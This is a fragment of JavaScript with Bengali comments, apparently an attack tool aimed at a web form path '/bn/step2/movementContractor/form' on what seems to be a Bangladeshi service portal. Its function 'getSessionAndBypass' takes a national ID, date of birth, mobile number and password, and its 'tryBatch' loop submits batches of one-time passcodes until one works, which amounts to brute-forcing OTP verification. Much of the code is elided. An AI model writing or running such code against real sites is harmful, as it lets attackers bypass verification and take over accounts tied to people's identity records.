...
const TARGET_LOCATION = "/bn/step2/movementContractor/form";
...
// Enhanced session creation with proper headers - Python code থেকে exact copy
async function getSessionAndBypass(nid, dob, mobile, password) {
    ...
    // Python code এর মতই session creation
...
async function tryBatch(session, cookies, otpBatch) {
    ...
    for (let i = 0; i < reversedBatch.length; i++) {
        const result = await tryOTP(session, cookies, reversedBatch[i]);
        if (result) {
            return result;
        }
    }
